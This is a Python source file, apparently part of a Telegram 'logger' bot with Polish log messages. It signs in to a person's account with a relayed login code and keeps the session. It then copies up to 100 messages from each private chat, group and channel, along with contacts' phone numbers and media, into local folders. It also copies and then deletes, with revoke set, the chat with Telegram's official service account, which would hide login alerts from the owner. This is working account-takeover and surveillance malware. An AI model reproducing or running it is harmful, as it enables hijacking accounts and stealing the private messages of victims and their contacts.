import os
import re
import shutil
from datetime import datetime
from telethon import TelegramClient
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.types import User
import aiofiles
import asyncio

client_locks = {}

def get_client(phone_number, session_name="session", bot_name="logger"):
    session_path = os.path.join(f"C:\\tgbot\\{bot_name}\\sessions", f"{session_name}_{phone_number.replace('+', '')}")
    from shared.config import API_ID, API_HASH
    client = TelegramClient(session_path, API_ID, API_HASH)
    if phone_number not in client_locks:
        client_locks[phone_number] = asyncio.Lock()
    return client

async def create_user_folder_and_files(client, user, bot_name):
    username = user.username if user.username else f"user_{user.id}"
    user_base_folder = os.path.join(f"C:\\tgbot\\{bot_name}\\users", username)
    if not os.path.exists(user_base_folder):
        os.makedirs(user_base_folder)
        print(f"Utworzono folder użytkownika: {user_base_folder}")
    else:
        print(f"Folder użytkownika już istnieje: {user_base_folder}")
    
    users_folder = os.path.join(user_base_folder, "users")
    groups_folder = os.path.join(user_base_folder, "groups")
    os.makedirs(users_folder, exist_ok=True)
    os.makedirs(groups_folder, exist_ok=True)
    
    dialogs = await client.get_dialogs()
    
    telegram_dialog = None
    for dialog in dialogs:
        if is_telegram_message(dialog.entity):
            telegram_dialog = dialog
            break
    
    if telegram_dialog:
        old_file_path = os.path.join(users_folder, "telegram_old.txt")
        messages_content = f"Użytkownik: @{username}, ID: {user.id}\nRozmowa z: Telegram (stara historia)\nNumer telefonu: Niedostępny\n\n"
        async for message in client.iter_messages(telegram_dialog.entity, limit=100):
            sender = await message.get_sender()
            sender_name = sender.username if sender and sender.username else "Nieznany"
            if message.text and is_telegram_message(sender):
                messages_content += f"[{message.date}] {sender_name}: {message.text}\n"
        async with aiofiles.open(old_file_path, "w", encoding="utf-8") as f:
            await f.write(messages_content)
        print(f"Utworzono plik telegram_old.txt: {old_file_path}")
        
        try:
            await client(DeleteHistoryRequest(peer=telegram_dialog.entity, max_id=0, just_clear=False, revoke=True))
            print(f"Usunięto cały czat z @Telegram dla {username}")
        except Exception as e:
            print(f"Błąd usuwania czatu z @Telegram: {e}")
        
        file_path = os.path.join(users_folder, "Telegram.txt")
        messages_content = f"Użytkownik: @{username}, ID: {user.id}\nRozmowa z: Telegram\nNumer telefonu: Niedostępny\n\n"
        async with aiofiles.open(file_path, "w", encoding="utf-8") as f:
            await f.write(messages_content)
        print(f"Utworzono nowy plik telegram.txt: {file_path}")
    
    for dialog in dialogs:
        if dialog.name and not is_telegram_message(dialog.entity):
            base_name = re.sub(r'[^\w\-_\. ]', '_', dialog.name)
            if dialog.is_user:
                target_folder = users_folder
                phone_number = dialog.entity.phone if isinstance(dialog.entity, User) and dialog.entity.phone else "Niedostępny"
            elif dialog.is_group or dialog.is_channel:
                target_folder = groups_folder
                phone_number = "Niedostępny"
            else:
                continue
            file_path = os.path.join(target_folder, f"{base_name}.txt")
            messages_content = f"Użytkownik: @{username}, ID: {user.id}\n{'Rozmowa z' if dialog.is_user else 'Grupa'}: {dialog.name}\n"
            if dialog.is_user:
                messages_content += f"Numer telefonu: {phone_number}\n"
            messages_content += "\n"
            async for message in client.iter_messages(dialog.entity, limit=100):
                sender = await message.get_sender()
                sender_name = sender.username if sender and sender.username else "Nieznany"
                if message.text and not is_telegram_message(sender):
                    messages_content += f"[{message.date}] {sender_name}: {message.text}\n"
            async with aiofiles.open(file_path, "w", encoding="utf-8") as f:
                await f.write(messages_content)
            print(f"Utworzono/Zaktualizowano plik: {file_path}")
    
    for dialog in dialogs:
        if dialog.is_user and dialog.name and not is_telegram_message(dialog.entity):
            base_name = re.sub(r'[^\w\-_\. ]', '_', dialog.name)
            user_subfolder = os.path.join(users_folder, base_name)
            file_path = os.path.join(users_folder, f"{base_name}.txt")
            has_media = False
            async for message in client.iter_messages(dialog.entity, limit=100):
                if message.media:
                    has_media = True
                    break
            if has_media:
                os.makedirs(user_subfolder, exist_ok=True)
                new_file_path = os.path.join(user_subfolder, f"{base_name}.txt")
                if os.path.exists(file_path):
                    if os.path.exists(new_file_path):
                        os.remove(new_file_path)
                    shutil.move(file_path, new_file_path)
                    print(f"Przeniesiono plik: {file_path} -> {new_file_path}")
                async for message in client.iter_messages(dialog.entity, limit=100):
                    if message.media:
                        media_path = os.path.join(user_subfolder, f"{message.date.strftime('%Y%m%d_%H%M%S')}")
                        if hasattr(message.media, 'photo'):
                            media_path += ".jpg"
                        elif hasattr(message.media, 'document'):
                            media_path += f".{message.media.document.attributes[-1].file_name.split('.')[-1] if message.media.document.attributes else 'mp4'}"
                        else:
                            continue
                        if not os.path.exists(media_path):
                            await client.download_media(message.media, media_path)
                            print(f"Pobrano plik: {media_path}")
    return username

async def login_user(phone_number, code, phone_code_hash, user_id, bot_name="logger"):
    login_client = get_client(phone_number, f"{bot_name}_session", bot_name)
    async with client_locks[phone_number]:
        try:
            print(f"Próba logowania na {phone_number} z kodem {code} i phone_code_hash {phone_code_hash}")
            if not login_client.is_connected():
                await login_client.connect()
            if not await login_client.is_user_authorized():
                await login_client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
            user = await login_client.get_me()
            username = await create_user_folder_and_files(login_client, user, bot_name)
            
            from shared.sessions import load_sessions, save_sessions
            current_sessions = load_sessions(bot_name, force_refresh=True)
            current_sessions[phone_number] = {
                "phone_number": phone_number,
                "user_id": user.id,
                "username": username
            }
            save_sessions(bot_name, current_sessions)
            return True
        except Exception as e:
            error_msg = f"❌ Błąd logowania {phone_number}: {str(e)}"
            print(error_msg)
            return False
        finally:
            if login_client.is_connected():
                await login_client.disconnect()

def is_telegram_message(sender):
    from shared.config import TELEGRAM_OFFICIAL_ID
    return sender and (sender.id == TELEGRAM_OFFICIAL_ID or sender.username == "Telegram" or (hasattr(sender, 'phone') and sender.phone == "42777"))

def get_client_locks():
    return client_locks

